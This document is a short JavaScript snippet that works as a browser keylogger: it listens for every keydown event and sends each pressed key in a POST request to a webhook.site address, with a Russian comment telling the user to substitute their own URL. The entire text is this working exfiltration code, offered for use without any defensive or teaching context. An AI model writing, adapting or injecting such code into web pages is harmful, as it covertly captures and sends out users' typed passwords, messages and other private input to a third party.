document.addEventListener("keydown", function(event) {
    fetch("https://webhook.site/7fcc2c49-186f-4f3d-8f14-7a03443e2a5d", {  // заменяем на твой URL
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: event.key })
    });
});
